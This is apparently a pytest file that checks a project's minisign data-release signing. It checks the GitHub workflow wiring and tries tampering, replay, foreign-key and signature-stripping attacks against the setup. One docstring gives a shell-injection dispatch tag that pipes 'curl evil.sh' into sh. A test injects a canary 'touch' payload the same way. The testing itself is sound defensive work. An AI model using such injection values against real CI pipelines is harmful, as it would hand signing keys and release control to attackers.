"""Gates for data-release signing (#289).

Two layers, because they fail in different ways:

1. **Wiring** — parse `release-data.yml` and assert the signing step is
   actually load-bearing: unconditional, hard-failing without the key,
   verifying against the committed public key, uploading the `.minisig`,
   and keeping key material out of the workspace. A signing step that
   silently no-ops is the failure mode #283 already cost this repo once
   (the HF mirror reported green through two releases while pushing
   nothing), and it is worse here — an unsigned release that *looks*
   signed defeats the point of signing.

2. **Behaviour** — generate a throwaway keypair, run the workflow's own
   signing shell against it, and verify with the consumer script. Then
   attack it: tamper the bytes, swap the key, replay a valid signature
   onto a different release, strip the signature. Each must be rejected.

The second layer matters more than it looks. The first only proves we
wrote the right YAML; only the second proves the commands in it actually
produce a signature a consumer can verify — and that the checks we claim
catch attacks really do.

Neither layer needs the parquet tree or the network, so these run in
every PR.
"""

from __future__ import annotations

import re
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

_REPO_ROOT = Path(__file__).parent.parent
_WORKFLOW = _REPO_ROOT / ".github" / "workflows" / "release-data.yml"
_VERIFY_SCRIPT = _REPO_ROOT / "scripts" / "verify_data_release.sh"
_KEYGEN_SCRIPT = _REPO_ROOT / "scripts" / "gen_signing_key.sh"
_DOCS = _REPO_ROOT / "docs" / "security" / "data-signing.md"
_PUBKEY = _REPO_ROOT / "docs" / "security" / "data-signing-key.pub"

_needs_minisign = pytest.mark.skipif(
    shutil.which("minisign") is None,
    reason="minisign not on PATH — run inside the devShell (nix develop)",
)


def _signing_step() -> dict:
    """Return the 'Sign tarball' step from the data-asset job."""
    wf = yaml.safe_load(_WORKFLOW.read_text())
    steps = wf["jobs"]["data-asset"]["steps"]
    # Match on "sign", not "minisign" — the apt-install step names the binary
    # too, and silently asserting against *that* step would make every check
    # below vacuous.
    matches = [s for s in steps if str(s.get("name", "")).lower().startswith("sign")]
    assert matches, (
        "release-data.yml has no signing step. Data releases must be signed "
        "(#289); without this step the release publishes unsigned bytes."
    )
    assert len(matches) == 1, f"expected exactly one signing step, found {[s['name'] for s in matches]}"
    return matches[0]


# -- Layer 1: workflow wiring ------------------------------------------------


def test_signing_step_runs_before_upload() -> None:
    """The tarball must be signed before the upload step, not after.

    Ordering is not cosmetic: `softprops/action-gh-release` uploads whatever
    the glob matches at the moment it runs. A signing step scheduled after it
    would publish the tarball with no signature beside it and still go green.
    """
    wf = yaml.safe_load(_WORKFLOW.read_text())
    steps = wf["jobs"]["data-asset"]["steps"]
    names = [str(s.get("name") or s.get("uses") or "") for s in steps]

    sign_idx = next(i for i, n in enumerate(names) if "minisign" in n.lower())
    upload_idx = next(i for i, s in enumerate(steps) if "softprops" in str(s.get("uses", "")))
    assert sign_idx < upload_idx, f"signing step (index {sign_idx}) must precede upload (index {upload_idx})"


def test_signing_step_is_unconditional() -> None:
    """No `if:` on the signing step.

    A conditional signing step is how 'unsigned release' becomes possible
    again. #289 chose hard-fail over a declared-state toggle precisely so
    there is no configuration in which a release publishes unsigned.
    """
    step = _signing_step()
    assert "if" not in step, (
        f"signing step carries a condition ({step.get('if')!r}). Signing must be "
        "unconditional — a skippable signature is not a guarantee (#289)."
    )


def test_signing_step_hard_fails_without_key() -> None:
    """A missing secret must exit non-zero, not warn-and-continue.

    This is the #283 lesson applied to signing: a job that reports success
    while doing nothing is worse than one that fails, because nothing
    downstream ever learns.
    """
    run = _signing_step()["run"]
    assert "::error::" in run, "signing step must emit a GitHub error annotation when the key is absent"
    assert re.search(r"exit\s+1", run), "signing step must exit non-zero when the key is absent"
    assert '-z "${DATA_SIGNING_KEY}"' in run or "-z ${DATA_SIGNING_KEY}" in run, (
        "signing step must explicitly check that DATA_SIGNING_KEY is set"
    )


def test_signing_step_uses_both_secrets() -> None:
    """Key and passphrase both come from repository secrets, not the repo."""
    step = _signing_step()
    env = step.get("env", {})
    assert "secrets.DATA_SIGNING_KEY" in str(env.get("DATA_SIGNING_KEY", ""))
    assert "secrets.DATA_SIGNING_KEY_PASSWORD" in str(env.get("DATA_SIGNING_KEY_PASSWORD", ""))


def test_key_material_never_touches_the_workspace() -> None:
    """The secret key is written under RUNNER_TEMP and shredded.

    Writing it into the checkout would put it one careless asset glob away
    from being published as a release artifact.
    """
    run = _signing_step()["run"]
    assert "RUNNER_TEMP" in run, "secret key must be written under RUNNER_TEMP, never the workspace"
    assert "shred" in run or "rm -f" in run, "secret key file must be removed when the step exits"
    assert "umask 077" in run, "secret key must be written with a restrictive umask"


def test_workflow_verifies_against_committed_pubkey() -> None:
    """CI must verify its own signature against the key consumers pin.

    Without this, a rotated-but-not-committed key, a corrupted secret, or a
    swapped signing identity all produce a green release carrying a signature
    no consumer can verify — discovered only downstream, by the consumer.
    """
    run = _signing_step()["run"]
    assert "data-signing-key.pub" in run, "signing step must reference the committed public key"
    assert "minisign -V" in run, "signing step must verify the signature it just produced"


def test_trusted_comment_binds_version_tag_and_digest() -> None:
    """The signed trusted comment must name the release, not just the bytes.

    minisign alone cannot detect a genuine signature for release A being
    served as release B. The trusted comment is covered by the signature, so
    carrying version/tag/sha256 in it is what makes replay detectable.
    """
    run = _signing_step()["run"]
    tc = re.search(r'TRUSTED_COMMENT="([^"]+)"', run)
    assert tc, "signing step must set a TRUSTED_COMMENT"
    body = tc.group(1)
    for field in ("${CALVER}", "tag=", "sha256="):
        assert field in body, f"trusted comment must carry {field!r}; got {body!r}"
    assert "-t " in run, "trusted comment must be passed to minisign via -t"


def test_signing_step_does_not_interpolate_untrusted_input_into_shell() -> None:
    """`${{ }}` expansions are textual substitution before bash parses the line.

    `inputs.tag` is supplied by whoever dispatches the workflow. Interpolated
    directly into the script body, a tag like:

        data-1.0.0"; curl evil.sh | sh; #

    executes in the one step that holds the signing key. Bound through `env:`
    instead, it is data and can never be code. Guarded here because the unsafe
    form is the natural thing to write and reads as harmless.
    """
    step = _signing_step()
    run = step["run"]
    assert "${{" not in run, (
        "signing step interpolates a GitHub expression into the shell body. "
        "Pass it through `env:` instead — this step holds the signing key."
    )
    env = step.get("env", {})
    assert "inputs.tag" in str(env.get("INPUT_TAG", "")), "the dispatch tag must be bound via env, not interpolated"


def test_signing_step_validates_the_tag_before_signing() -> None:
    """The tag goes into the signed trusted comment, so it must be constrained.

    A signature is a durable assertion; asserting over unvalidated text is how
    a verifier is handed something it will parse as a different release.
    """
    run = _signing_step()["run"]
    assert re.search(r"\^data-\[0-9\]\{4\}", run), (
        "signing step must validate the tag matches data-YYYY.MM.MICRO before signing"
    )


def test_signature_asset_is_uploaded() -> None:
    """The .minisig must be in the upload glob — signing it is not publishing it."""
    wf = yaml.safe_load(_WORKFLOW.read_text())
    steps = wf["jobs"]["data-asset"]["steps"]
    upload = next(s for s in steps if "softprops" in str(s.get("uses", "")))
    files = str(upload["with"]["files"])
    assert "SIG_PATH" in files, f"upload step does not publish the signature; files={files!r}"
    assert upload["with"].get("fail_on_unmatched_files") is True, (
        "fail_on_unmatched_files must stay true, or a missing .minisig uploads silently"
    )


def test_release_workflow_has_no_pull_request_trigger() -> None:
    """A key reachable from a PR-triggered workflow attests to nothing.

    #289's stated pitfall. Guarded here so a later convenience trigger cannot
    quietly put the signing key within reach of untrusted code.
    """
    wf = yaml.safe_load(_WORKFLOW.read_text())
    # PyYAML parses the bare key `on:` as the boolean True.
    triggers = wf.get("on", wf.get(True))
    assert "pull_request" not in triggers, (
        "release-data.yml must not be triggered by pull_request — a PR must never "
        "be able to reach DATA_SIGNING_KEY (#289)."
    )
    assert "pull_request_target" not in triggers


# -- Layer 1b: the cutoff constant and the docs agree ------------------------


def _first_signed_version() -> str:
    m = re.search(r'^FIRST_SIGNED_VERSION="([^"]+)"', _VERIFY_SCRIPT.read_text(), re.M)
    assert m, "verify_data_release.sh must define FIRST_SIGNED_VERSION"
    return m.group(1)


def test_grandfathering_cutoff_matches_docs() -> None:
    """One cutoff, stated once.

    Consumers branch on 'require a signature at or above version X'. If the
    script and the docs disagree about X, some consumer trusts an unsigned
    release. The constant is the source of truth; the docs must quote it.
    """
    version = _first_signed_version()
    assert re.match(r"^\d{4}\.\d+\.\d+$", version), f"FIRST_SIGNED_VERSION={version!r} is not CalVer"
    docs = _DOCS.read_text()
    assert f"data-{version}" in docs, (
        f"docs/security/data-signing.md does not mention the cutoff data-{version}. "
        "Update the docs to match FIRST_SIGNED_VERSION in verify_data_release.sh."
    )


def test_docs_document_rotation_and_grandfathering() -> None:
    """#289's acceptance criteria include a documented rotation procedure."""
    docs = _DOCS.read_text().lower()
    for topic in ("rotation", "grandfather", "custody"):
        assert topic in docs, f"docs/security/data-signing.md must cover {topic}"


def test_secret_key_material_is_gitignored() -> None:
    """A stray secret key must not be committable.

    The keygen script writes a real signing key to disk. The public key is
    allowlisted by name; everything else in docs/security/ stays ignored.
    """
    proc = subprocess.run(
        ["git", "check-ignore", "docs/security/data-signing.key", "some/path/minisign.sec"],
        cwd=_REPO_ROOT,
        capture_output=True,
        text=True,
    )
    ignored = set(proc.stdout.split())
    assert "docs/security/data-signing.key" in ignored, "secret key material in docs/security/ must be gitignored"
    assert "some/path/minisign.sec" in ignored, "*.sec must be gitignored"


# -- Layer 1c: the committed public key, once it exists ----------------------


def test_public_key_is_a_valid_minisign_key() -> None:
    """The committed pubkey must be a well-formed minisign Ed25519 key.

    Skips until the key is generated — it can only be produced by the key
    holder, offline (#289). Once committed, it is checked on every run: a
    truncated or mangled key is a release-time failure otherwise.
    """
    if not _PUBKEY.exists():
        pytest.skip(f"{_PUBKEY.relative_to(_REPO_ROOT)} not committed yet — run `just gen-signing-key`")

    import base64

    lines = [ln for ln in _PUBKEY.read_text().splitlines() if ln.strip()]
    assert len(lines) == 2, f"minisign pubkey file must be 2 lines (comment + key), got {len(lines)}"
    assert lines[0].startswith("untrusted comment:"), "first line must be the untrusted comment"

    raw = base64.b64decode(lines[1].strip(), validate=True)
    # 2-byte algorithm id ('Ed') + 8-byte key id + 32-byte Ed25519 public key.
    assert len(raw) == 42, f"decoded pubkey must be 42 bytes, got {len(raw)}"
    assert raw[:2] == b"Ed", f"unexpected minisign algorithm id {raw[:2]!r} (expected b'Ed')"


# -- Layer 2: it actually signs, and the attacks actually fail ---------------


def _run_workflow_signing_step(
    workdir: Path,
    *,
    secret_key: str,
    password: str,
    asset: str,
    calver: str,
    input_tag: str = "",
    ref_name: str = "",
) -> subprocess.CompletedProcess:
    """Execute the signing step's actual `run:` body from release-data.yml.

    Not a re-implementation — the shell is lifted verbatim out of the workflow
    and executed. That is only possible because the step contains no `${{ }}`
    interpolation (enforced by
    test_signing_step_does_not_interpolate_untrusted_input_into_shell), which
    is also why the step is safe from script injection. The two properties are
    the same property, so this test and that one reinforce each other.

    Running the real body is what makes the wiring assertions meaningful: a
    string check like `'umask 077' in run` still passes if a `then` is missing
    or a quote is wrong, but this does not.
    """
    runner_temp = workdir / "runner-temp"
    runner_temp.mkdir(exist_ok=True)
    github_env = workdir / "github-env"
    github_env.touch()

    env = {
        "PATH": __import__("os").environ["PATH"],
        "HOME": str(workdir),
        "DATA_SIGNING_KEY": secret_key,
        "DATA_SIGNING_KEY_PASSWORD": password,
        "INPUT_TAG": input_tag,
        "REF_NAME": ref_name,
        # Exported into the step's environment by the preceding Build step via
        # $GITHUB_ENV; supplied directly here.
        "ASSET_PATH": asset,
        "CALVER": calver,
        "RUNNER_TEMP": str(runner_temp),
        "GITHUB_ENV": str(github_env),
    }
    return subprocess.run(
        ["bash", "-c", _signing_step()["run"]],
        cwd=workdir,
        env=env,
        capture_output=True,
        text=True,
    )


@pytest.fixture()
def signed_release(tmp_path: Path) -> dict:
    """Generate a throwaway key and sign a tarball by running the workflow's own step."""
    pubkey_dir = tmp_path / "docs" / "security"
    pubkey_dir.mkdir(parents=True)
    pubkey = pubkey_dir / "data-signing-key.pub"
    seckey = tmp_path / "data-signing.key"
    password = "test-passphrase"

    subprocess.run(
        ["minisign", "-G", "-f", "-p", str(pubkey), "-s", str(seckey)],
        input=f"{password}\n{password}\n",
        text=True,
        capture_output=True,
        check=True,
    )

    version = "2026.8.2"
    asset = f"nucl-parquet-data-{version}.tar.zst"
    tarball = tmp_path / asset
    tarball.write_bytes(b"not really zstd, but the signature does not care\n" * 64)

    proc = _run_workflow_signing_step(
        tmp_path,
        secret_key=seckey.read_text(),
        password=password,
        asset=asset,
        calver=version,
        ref_name=f"data-{version}",
    )
    assert proc.returncode == 0, f"the workflow's signing step failed:\n{proc.stdout}\n{proc.stderr}"

    import hashlib

    return {
        "dir": tmp_path,
        "pubkey": pubkey,
        "seckey": seckey,
        "password": password,
        "tarball": tarball,
        "sig": tarball.with_suffix(tarball.suffix + ".minisig"),
        "version": version,
        "tag": f"data-{version}",
        "sha": hashlib.sha256(tarball.read_bytes()).hexdigest(),
    }


def _verify(signed: dict, *, version: str | None = None, pubkey: Path | None = None) -> subprocess.CompletedProcess:
    return subprocess.run(
        [
            str(_VERIFY_SCRIPT),
            "--file",
            str(signed["tarball"]),
            "--version",
            version or signed["version"],
            "--pubkey",
            str(pubkey or signed["pubkey"]),
        ],
        capture_output=True,
        text=True,
        cwd=_REPO_ROOT,
    )


@_needs_minisign
def test_verify_accepts_a_genuine_signature(signed_release: dict) -> None:
    """The happy path — a real signature over real bytes verifies."""
    proc = _verify(signed_release)
    assert proc.returncode == 0, f"verification of a genuine signature failed:\n{proc.stdout}\n{proc.stderr}"
    assert "signature valid" in proc.stdout


@_needs_minisign
def test_verify_rejects_tampered_bytes(signed_release: dict) -> None:
    """One appended byte must break verification."""
    with signed_release["tarball"].open("ab") as fh:
        fh.write(b"\x00")
    proc = _verify(signed_release)
    assert proc.returncode != 0, "tampered tarball verified — signature check is not load-bearing"
    assert "VERIFICATION FAILED" in proc.stderr


@_needs_minisign
def test_verify_rejects_a_foreign_key(signed_release: dict, tmp_path: Path) -> None:
    """A signature from a key consumers did not pin must be rejected.

    This is the whole point: 'validly signed' is worthless without 'signed by
    *us*'.
    """
    other = tmp_path / "other.pub"
    subprocess.run(
        ["minisign", "-G", "-W", "-f", "-p", str(other), "-s", str(tmp_path / "other.key")],
        capture_output=True,
        check=True,
    )
    proc = _verify(signed_release, pubkey=other)
    assert proc.returncode != 0, "signature from a foreign key was accepted"
    assert "VERIFICATION FAILED" in proc.stderr


@_needs_minisign
def test_verify_detects_replay_onto_another_release(signed_release: dict) -> None:
    """A genuine signature served as a *different* release must be caught.

    minisign says yes here — the bytes and signature really do match. Only
    the trusted-comment cross-check distinguishes 'authentic bytes for the
    release you asked for' from 'authentic bytes for an older release with a
    known defect'. This is the test that justifies the trusted comment
    carrying tag and digest at all.
    """
    proc = _verify(signed_release, version="2026.9.9")
    assert proc.returncode != 0, "a signature for a different release was accepted — replay is possible"
    assert "REPLAY DETECTED" in proc.stderr


@_needs_minisign
def test_verify_rejects_a_stripped_signature(signed_release: dict) -> None:
    """A removed .minisig must fail, not degrade to 'unsigned is fine'."""
    signed_release["sig"].unlink()
    proc = _verify(signed_release)
    assert proc.returncode != 0, "missing signature was treated as acceptable"


@_needs_minisign
def test_verify_rejects_a_doctored_trusted_comment(signed_release: dict) -> None:
    """Editing the trusted comment must invalidate the signature.

    The trusted comment is only trustworthy because it is *covered* by the
    signature. If a rewritten comment still verified, every claim the
    verifier makes from it (version, tag, digest) would be forgeable.
    """
    sig = signed_release["sig"]
    text = sig.read_text()
    sig.write_text(re.sub(r"^trusted comment: .*$", "trusted comment: nucl-parquet data 9999.1.1", text, flags=re.M))
    proc = _verify(signed_release)
    assert proc.returncode != 0, "a doctored trusted comment verified — the comment is not actually signed"


# -- Layer 2b: the keygen script is safe to run ------------------------------


@_needs_minisign
def test_workflow_step_hard_fails_when_the_key_is_absent(tmp_path: Path) -> None:
    """Run the real step with no key and confirm it exits non-zero.

    The wiring test only checks that the strings `::error::` and `exit 1`
    appear. This runs the shell.
    """
    (tmp_path / "docs" / "security").mkdir(parents=True)
    (tmp_path / "docs" / "security" / "data-signing-key.pub").write_text("untrusted comment: x\nRWQ\n")
    (tmp_path / "asset.tar.zst").write_bytes(b"x")

    proc = _run_workflow_signing_step(
        tmp_path, secret_key="", password="", asset="asset.tar.zst", calver="2026.8.2", ref_name="data-2026.8.2"
    )
    assert proc.returncode != 0, "signing step succeeded with no key — an unsigned release would publish"
    assert "::error::" in proc.stdout + proc.stderr


@_needs_minisign
def test_workflow_step_rejects_an_injected_tag(tmp_path: Path) -> None:
    """A crafted dispatch tag must be rejected, not executed.

    The canary file would only appear if the tag were interpreted as shell.
    """
    (tmp_path / "docs" / "security").mkdir(parents=True)
    pub = tmp_path / "docs" / "security" / "data-signing-key.pub"
    sec = tmp_path / "k.key"
    subprocess.run(
        ["minisign", "-G", "-f", "-p", str(pub), "-s", str(sec)],
        input="pw\npw\n",
        text=True,
        capture_output=True,
        check=True,
    )
    (tmp_path / "asset.tar.zst").write_bytes(b"x")
    canary = tmp_path / "PWNED"

    proc = _run_workflow_signing_step(
        tmp_path,
        secret_key=sec.read_text(),
        password="pw",
        asset="asset.tar.zst",
        calver="2026.8.2",
        input_tag=f'data-2026.8.2"; touch {canary}; #',
    )
    assert not canary.exists(), "the dispatch tag was executed as shell — script injection is possible"
    assert proc.returncode != 0, "a malformed tag was accepted for signing"


@_needs_minisign
def test_verify_rejects_a_signature_file_with_extra_lines(signed_release: dict) -> None:
    """An appended `trusted comment:` line must be refused, not parsed.

    minisign accepts a 5-line .minisig — it ignores anything past line 4
    (confirmed against 0.12). Only line 3 is covered by the global signature,
    so a naive `sed -n 's/^trusted comment: //p'` would parse the attacker's
    appended line alongside the real one and make claims from unsigned text.
    """
    sig = signed_release["sig"]
    with sig.open("a") as fh:
        fh.write("trusted comment: nucl-parquet data 9999.1.1 tag=data-9999.1.1 sha256=" + "de" * 32 + "\n")
    proc = _verify(signed_release)
    assert proc.returncode != 0, "a .minisig with unsigned extra lines was accepted"
    assert "malformed signature file" in proc.stderr


# -- Layer 2c: the grandfathering cutoff is enforced, not just documented ----


@_needs_minisign
def test_allow_unsigned_is_refused_at_or_above_the_cutoff(signed_release: dict) -> None:
    """--allow-unsigned must not downgrade a version that should be signed.

    The attack it closes: strip the .minisig in transit (or rewrite the mutable
    release), let the consumer hit the 'carries no signature' error, and rely on
    them re-running with the flag that error suggests. If the flag applied at
    any version, the whole signing scheme would be one retry away from bypass.
    """
    signed_release["sig"].unlink()
    proc = subprocess.run(
        [
            str(_VERIFY_SCRIPT),
            "--file",
            str(signed_release["tarball"]),
            "--version",
            _first_signed_version(),
            "--pubkey",
            str(signed_release["pubkey"]),
            "--allow-unsigned",
        ],
        capture_output=True,
        text=True,
        cwd=_REPO_ROOT,
    )
    assert proc.returncode != 0, "--allow-unsigned bypassed verification at the cutoff version"
    assert "refusing --allow-unsigned" in proc.stderr


@_needs_minisign
def test_allow_unsigned_is_permitted_below_the_cutoff(signed_release: dict) -> None:
    """Genuinely pre-signing releases stay verifiable-with-opt-out.

    The cutoff has to permit as well as refuse, or the grandfathering rule is
    just a hard failure with extra steps.
    """
    signed_release["sig"].unlink()
    proc = subprocess.run(
        [
            str(_VERIFY_SCRIPT),
            "--file",
            str(signed_release["tarball"]),
            "--version",
            "2026.7.2",
            "--pubkey",
            str(signed_release["pubkey"]),
            "--allow-unsigned",
        ],
        capture_output=True,
        text=True,
        cwd=_REPO_ROOT,
    )
    assert proc.returncode == 0, f"--allow-unsigned rejected a pre-cutoff release:\n{proc.stderr}"
    assert "NOTHING about these bytes has been verified" in proc.stderr, (
        "the opt-out warning must state plainly that nothing was checked"
    )


def test_unsigned_warning_does_not_claim_checks_it_does_not_run() -> None:
    """The opt-out path must not name a control that is not running.

    It previously claimed integrity rested on 'the catalog SHA-256 pin' — a
    check this script never performs. Naming an absent control in the one
    message a user reads while deciding to trust unverified bytes is worse
    than saying nothing.
    """
    src = _VERIFY_SCRIPT.read_text()
    # Only the emitted WARNING lines matter — prose comments may legitimately
    # discuss the pin in order to explain why it is *not* claimed here.
    warnings = [ln for ln in src.splitlines() if "WARNING:" in ln and not ln.strip().startswith("#")]
    assert warnings, "the unsigned opt-out must warn"
    joined = " ".join(warnings)
    assert "pin" not in joined and "data_sha256" not in joined, (
        f"the opt-out warning claims a SHA-256 pin check this script never performs: {joined}"
    )
    assert "NOTHING about these bytes has been verified" in joined


def test_calver_comparison_is_numeric_not_lexical() -> None:
    """2026.8.10 is newer than 2026.8.9; a string compare disagrees.

    Exercised through the script itself: a .9 release must still be treated as
    below a .10 cutoff.
    """
    src = _VERIFY_SCRIPT.read_text()
    assert "_calver_lt" in src, "the cutoff comparison must be numeric"
    assert "(( a[i] < b[i] ))" in src, "CalVer components must be compared as integers"


def test_keygen_refuses_to_silently_overwrite_an_existing_key() -> None:
    """Rotation must be deliberate.

    Overwriting the key in place breaks every consumer that pinned the old
    one, so the script demands explicit confirmation and points at the
    runbook.
    """
    src = _KEYGEN_SCRIPT.read_text()
    assert "already exists" in src, "keygen must detect an existing public key"
    assert "rotate" in src, "keygen must require explicit confirmation before rotating"


def test_keygen_validates_the_passphrase_before_uploading() -> None:
    """A wrong passphrase must fail locally, not at the next release.

    If CI holds a password that cannot decrypt the key, the first signed
    release is what discovers it — after the tag is already pushed.
    """
    src = _KEYGEN_SCRIPT.read_text()
    idx_check = src.find("does not decrypt the key")
    idx_upload = src.find("gh secret set")
    assert idx_check != -1, "keygen must verify the passphrase decrypts the key"
    assert idx_check < idx_upload, "passphrase check must happen before any secret is uploaded"


def test_keygen_prompts_for_the_passphrase_once_and_confirms_it() -> None:
    """The passphrase is read once, confirmed, then fed to minisign.

    Letting minisign prompt and *then* asking again for the copy to upload
    means typing the same secret three times, and a typo on the third puts a
    passphrase in CI that cannot decrypt the key. It also breaks outright when
    stdin is not a terminal: minisign drains stdin, so the follow-up read hits
    EOF and `set -e` aborts after the keypair is already on disk.
    """
    src = _KEYGEN_SCRIPT.read_text()
    assert "PASSPHRASE_CONFIRM" in src, "keygen must ask the passphrase twice and compare"
    assert "passphrases do not match" in src, "keygen must reject a mismatched confirmation"

    # Match executable lines only — comments mention `minisign -G` too, and
    # matching one of those would compare against the wrong position.
    code = [ln for ln in src.splitlines() if not ln.strip().startswith("#")]
    idx_prompt = next(i for i, ln in enumerate(code) if "read -r -s -p" in ln)
    idx_gen = next(i for i, ln in enumerate(code) if "minisign -G" in ln)
    assert idx_prompt < idx_gen, "the passphrase must be collected before minisign -G, then piped into it"


def test_keygen_rejects_an_empty_passphrase() -> None:
    """An empty passphrase leaves the offline master copy unprotected.

    The copy in the password manager is the one the passphrase actually
    protects — the CI copy is guarded by the secret store either way.
    """
    src = _KEYGEN_SCRIPT.read_text()
    assert "empty passphrase" in src, "keygen must reject an empty passphrase"


def test_keygen_shreds_the_key_on_an_unsuccessful_exit() -> None:
    """An aborted run must not leave an undocumented signing key on disk.

    If the script dies between `minisign -G` and the closing message — wrong
    passphrase, gh failure, Ctrl-C — a real secret key sits in a temp dir that
    nobody has been told about. It is kept only once the run completes, because
    at that point the operator still has to move it into their password
    manager and the closing message names the path.
    """
    src = _KEYGEN_SCRIPT.read_text()
    assert "trap on_exit EXIT" in src, "keygen must clean up key material on abnormal exit"
    assert "COMPLETED=0" in src and "COMPLETED=1" in src, "the trap must distinguish success from abort"

    idx_completed = src.find("COMPLETED=1")
    idx_upload = src.rfind("gh secret set")
    assert idx_upload < idx_completed, "the run is only 'completed' after both secrets are uploaded"
